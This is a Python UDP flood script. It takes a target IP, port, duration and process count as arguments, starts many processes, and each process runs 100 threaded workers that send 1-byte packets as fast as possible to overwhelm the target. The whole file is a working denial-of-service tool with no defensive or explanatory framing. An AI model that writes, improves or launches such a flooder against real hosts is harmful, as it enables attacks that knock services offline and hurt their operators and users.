import asyncio
import multiprocessing
import os
import random
import socket
import time
import sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
duration = int(sys.argv[3])
num_procs = int(sys.argv[4])  # e.g. 50

payload = b"\x00"  # 1-byte packet for max PPS


def udp_flood_worker(ip, port, end_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (ip, port)

    packets_sent = 0
    try:
        while time.time() < end_time:
            sock.sendto(payload, addr)
            packets_sent += 1
    except Exception:
        pass
    finally:
        sock.close()
        return packets_sent


async def async_worker(ip, port, end_time):
    loop = asyncio.get_event_loop()
    tasks = []

    for _ in range(100):  # Launch 100 raw socket writers per async worker
        tasks.append(loop.run_in_executor(None, udp_flood_worker, ip, port, end_time))

    await asyncio.gather(*tasks)


def start_flood(ip, port, duration):
    end_time = time.time() + duration
    try:
        asyncio.run(async_worker(ip, port, end_time))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    print(f"[i] Flooding {target_ip}:{target_port} for {duration}s using {num_procs} processes (Max PPS mode)")

    procs = []
    for _ in range(num_procs):
        p = multiprocessing.Process(target=start_flood, args=(target_ip, target_port, duration))
        p.start()
        procs.append(p)

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Stopping all workers...")
        for p in procs:
            p.terminate()
